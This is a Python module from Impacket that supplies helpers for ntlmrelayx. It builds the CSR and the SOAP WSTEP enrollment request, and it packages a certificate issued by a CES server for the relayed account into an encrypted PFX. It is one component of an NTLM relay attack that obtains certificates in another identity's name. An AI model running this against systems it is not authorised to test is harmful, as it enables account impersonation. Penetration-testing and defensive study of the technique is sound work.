# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# CES/WSTEP helpers used by ntlmrelayx.

import base64
import binascii
import os
import re
import secrets
import threading
import uuid
import xml.etree.ElementTree as ET
from html import escape
from urllib.parse import urlparse, urlunparse

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs12, pkcs7
from cryptography.x509.oid import NameOID


SOAP_NS = "http://www.w3.org/2003/05/soap-envelope"
ADDR_NS = "http://www.w3.org/2005/08/addressing"
WST_NS = "http://docs.oasis-open.org/ws-sx/ws-trust/200512"
WSS_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
WSS_UTILITY_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"
AUTHZ_NS = "http://schemas.xmlsoap.org/ws/2006/12/authorization"
ENROLL_NS = "http://schemas.microsoft.com/windows/pki/2009/01/enrollment"
TOKEN_TYPE_X509V3 = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3"
REQUEST_TYPE_ISSUE = WST_NS + "/Issue"
VALUE_TYPE_PKCS10 = ENROLL_NS + "#PKCS10"
ENCODING_BASE64 = WSS_NS + "#base64binary"
CES_ACTION = ENROLL_NS + "/RST/wstep"
CES_TEMPLATE_DEFAULT = "Machine"
CES_MAX_RESPONSE = 10 * 1024 * 1024
CES_PFX_FRIENDLY_NAME = b"ntlm-ces-relay-issued-certificate"

_SAFE_FILENAME_RE = re.compile(r"[^A-Za-z0-9_.@$-]+")
_WHITESPACE_RE = re.compile(r"\s+")
_ARTIFACT_LOCK = threading.Lock()
_ALLOCATED_PREFIXES = set()


class CESConfigurationError(ValueError):
    pass


def validate_ces_target(target):
    """Validate an explicit HTTP(S) CES URL without making a request."""
    try:
        parsed = urlparse(target)
        port = parsed.port
    except (TypeError, ValueError) as exc:
        raise CESConfigurationError("Invalid CES target URL %r: %s" % (target, exc)) from exc
    if parsed.scheme.lower() not in ("http", "https") or not parsed.hostname:
        raise CESConfigurationError("CES targets must be explicit HTTP or HTTPS URLs: %s" % target)
    if parsed.scheme.lower() == "all":
        raise CESConfigurationError("ALL:// targets are not supported in CES mode")
    if port is not None and not 1 <= port <= 65535:
        raise CESConfigurationError("Invalid port in CES target: %s" % target)
    return parsed


def validate_ces_targets_file(filename):
    target_count = 0
    with open(filename, "r") as targets_file:
        for line_number, line in enumerate(targets_file, 1):
            target = line.strip()
            if not target or target.startswith("#"):
                continue
            target_count += 1
            try:
                validate_ces_target(target)
            except CESConfigurationError as exc:
                raise CESConfigurationError("%s:%d: %s" % (filename, line_number, exc)) from exc
    if target_count == 0:
        raise CESConfigurationError("CES targets file contains no targets: %s" % filename)


def soap_http_headers(content_length):
    return {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "User-Agent": "MS-WebServices/1.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Content-Length": str(content_length),
    }


def derive_subject_cn(relayed_username):
    if not relayed_username:
        return "CES-Enrollment"
    value = relayed_username.split("\\")[-1].split("/")[-1].split("@")[0]
    return value or "CES-Enrollment"


def sanitize_identity(relayed_identity):
    value = (relayed_identity or "relayed").replace("\\", "_").replace("/", "_")
    value = _SAFE_FILENAME_RE.sub("_", value).strip("._")
    return value or "relayed"


def generate_csr(relayed_username):
    """Return a base64 DER PKCS#10 request and its generated RSA key."""
    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, derive_subject_cn(relayed_username))]))
        .sign(key, hashes.SHA256())
    )
    return base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode("ascii"), key


def build_additional_context(template):
    return '<AdditionalContext xmlns="%s"><ContextItem Name="CertificateTemplate"><Value>%s</Value></ContextItem></AdditionalContext>' % (
        AUTHZ_NS, escape(template, quote=True)
    )


def _has_explicit_port(netloc):
    authority = netloc.rsplit("@", 1)[-1]
    if authority.startswith("["):
        closing_bracket = authority.find("]")
        return closing_bracket >= 0 and authority[closing_bracket + 1:].startswith(":")
    return ":" in authority


def build_ces_soap(target_url, csr_b64, template=CES_TEMPLATE_DEFAULT, message_id=None):
    if not csr_b64:
        raise CESConfigurationError("CSR data is required")
    if not template:
        raise CESConfigurationError("Certificate template is required")
    parsed = validate_ces_target(target_url)
    # Rebuild the URL without any identity/userinfo. Keep path, query and an
    # explicitly supplied port, including an explicit default port.
    host = parsed.hostname
    if ":" in host and not host.startswith("["):
        host = "[%s]" % host
    if _has_explicit_port(parsed.netloc):
        host = "%s:%d" % (host, parsed.port)
    to_url = urlunparse((parsed.scheme, host, parsed.path or "/", "", parsed.query, ""))
    mid = message_id or "urn:uuid:%s" % uuid.uuid4()
    return """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:a="{addr}" xmlns:s="{soap}">
  <s:Header>
    <a:Action s:mustUnderstand="1">{action}</a:Action>
    <a:MessageID>{message_id}</a:MessageID>
    <a:To s:mustUnderstand="1">{to}</a:To>
  </s:Header>
  <s:Body>
    <RequestSecurityToken PreferredLanguage="en-US" xmlns="{wst}">
      <TokenType>{token_type}</TokenType>
      <RequestType>{request_type}</RequestType>
      <BinarySecurityToken ValueType="{value_type}" EncodingType="{encoding}" a:Id="" xmlns:a="{utility}" xmlns="{wss}">{csr}</BinarySecurityToken>
      {context}
    </RequestSecurityToken>
  </s:Body>
</s:Envelope>
""".format(
        addr=ADDR_NS, soap=SOAP_NS, action=escape(CES_ACTION),
        message_id=escape(mid), to=escape(to_url), wst=WST_NS,
        token_type=escape(TOKEN_TYPE_X509V3), request_type=escape(REQUEST_TYPE_ISSUE),
        value_type=escape(VALUE_TYPE_PKCS10), encoding=escape(ENCODING_BASE64),
        utility=WSS_UTILITY_NS, wss=WSS_NS, csr=escape(csr_b64),
        context=build_additional_context(template),
    )


def target_url(target, relay_client=None):
    scheme = target.scheme.lower()
    host = target.hostname
    if ":" in host and not host.startswith("["):
        host = "[%s]" % host
    if _has_explicit_port(target.netloc):
        host = "%s:%d" % (host, target.port)
    path = getattr(relay_client, "path", None) or target.path or "/"
    query = getattr(relay_client, "query", None)
    if query is None:
        query = target.query
    return urlunparse((scheme, host, path, "", query, ""))


def extract_response_tokens(xml_bytes):
    if not xml_bytes:
        raise RuntimeError("CES returned an empty response")
    if len(xml_bytes) > CES_MAX_RESPONSE:
        raise RuntimeError("CES response exceeds the %d-byte limit" % CES_MAX_RESPONSE)
    try:
        root = ET.fromstring(xml_bytes)
    except ET.ParseError as exc:
        raise RuntimeError("CES returned malformed XML: %s" % exc) from exc

    fault = root.find(".//{%s}Fault" % SOAP_NS)
    if fault is not None:
        reason = fault.find(".//{%s}Text" % SOAP_NS)
        text = (reason.text or "").strip() if reason is not None else "unspecified fault"
        raise RuntimeError("CES SOAP fault: %s" % text[:1000])

    cert_tokens = []
    p7b_tokens = []
    for node in root.findall(".//{%s}BinarySecurityToken" % WSS_NS):
        value = _WHITESPACE_RE.sub("", node.text or "")
        if not value:
            continue
        value_type = node.attrib.get("ValueType", "")
        if "X509v3" in value_type:
            cert_tokens.append(value)
        elif "PKCS7" in value_type:
            p7b_tokens.append(value)
    return cert_tokens, p7b_tokens


def decode_certificate(value):
    try:
        data = base64.b64decode(value, validate=True)
        certificate = x509.load_der_x509_certificate(data)
    except (binascii.Error, ValueError) as exc:
        raise RuntimeError("CES returned an invalid X509 certificate token") from exc
    return data, certificate


def decode_pkcs7(value):
    try:
        data = base64.b64decode(value, validate=True)
        pkcs7.load_der_pkcs7_certificates(data)
    except (binascii.Error, ValueError) as exc:
        raise RuntimeError("CES returned an invalid PKCS#7 token") from exc
    return data


def create_encrypted_pfx(certificate, key):
    cert_public = certificate.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    key_public = key.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    if cert_public != key_public:
        raise RuntimeError("Issued certificate does not match the generated private key")
    password = secrets.token_urlsafe(18)
    data = pkcs12.serialize_key_and_certificates(
        name=CES_PFX_FRIENDLY_NAME, key=key, cert=certificate, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(password.encode("utf-8")),
    )
    return data, password


def allocate_artifact_paths(output_dir, identity):
    output_dir = os.path.abspath(output_dir)
    if not os.path.isdir(output_dir):
        raise OSError("CES output directory does not exist: %s" % output_dir)
    base = sanitize_identity(identity)
    with _ARTIFACT_LOCK:
        suffix = 0
        while True:
            prefix = base if suffix == 0 else "%s-%d" % (base, suffix)
            paths = {ext: os.path.join(output_dir, prefix + "." + ext) for ext in ("cer", "p7b", "pfx")}
            marker = os.path.join(output_dir, prefix)
            if marker not in _ALLOCATED_PREFIXES and not any(os.path.exists(path) for path in paths.values()):
                _ALLOCATED_PREFIXES.add(marker)
                return paths
            suffix += 1


def secure_write(path, data):
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(descriptor, "wb") as output:
            descriptor = None
            output.write(data)
    finally:
        if descriptor is not None:
            os.close(descriptor)
